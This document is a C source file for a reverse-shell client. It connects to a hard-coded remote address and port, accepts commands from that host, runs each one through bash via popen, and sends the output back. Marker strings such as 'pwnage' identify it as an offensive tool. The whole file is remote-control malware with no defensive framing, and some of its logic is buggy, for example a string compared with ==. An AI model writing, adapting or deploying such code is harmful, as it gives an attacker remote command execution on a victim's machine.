#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#define PORT 1905

char* concat(const char *s1, const char *s2){
    const size_t len1 = strlen(s1);
    const size_t len2 = strlen(s2);
    char *result = malloc(len1 + len2 + 1);
    memcpy(result, s1, len1);
    memcpy(result + len1, s2, len2 + 1);
    return result;
}

int main(int argc, char const *argv[]) {
    int sock = 0, valread;
    struct sockaddr_in serv_addr;
    char buffer[99999] = {0};
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        return -1;
    }
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);
    if(inet_pton(AF_INET, "192.168.1.158", &serv_addr.sin_addr)<=0) {
        return -1;
    }

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        return -1;
    }
    valread = read(sock , buffer, 99999);
    while (1) {
      send(sock, "unencrypted", strlen("unencrypted"), 0);
      valread = read(sock , buffer, 99999);
      strtok(buffer, "\n");
      strtok(buffer, "\r");
      if (!strcmp(buffer,"pwnage")) {
        initAni();
      } else if (!strcmp(buffer,"areyouhere?")) {
        send(sock, "yes", strlen("yes"), 0 );
      } else {
        FILE *fp,*outputfile;
        char var[1024];
        char* first = "exec bash -c \"";
        char* second = "\"";
        char* third = concat(first, buffer);
        char* full = concat(third, second);
        fp = popen(full, "r");
        fgets(var, sizeof(var), fp);
        while (fgets(var, sizeof(var), fp) != NULL){
          printf("%s\n", var);
          send(sock, var, strlen(var), 0);
        }
        while (1) {
          valread = read(sock , buffer, 99999);
          strtok(buffer, "\n");
          strtok(buffer, "\r");
          if (buffer == "terminated010203") {
            break;
          }
          char* first = "exec bash -c \"";
          char* second = "\"";
          char* third = concat(first, buffer);
          char* full = concat(third, second);
          fp = popen(full, "r");
          fgets(var, sizeof(var), fp);
          while (fgets(var, sizeof(var), fp) != NULL){
            printf("%s\n", var);
            send(sock, var, strlen(var), 0);
          }
        }
        send(sock, "terminated010203", strlen("terminated010203"), 0);
        pclose(fp);
      }
    }
    return 0;
}
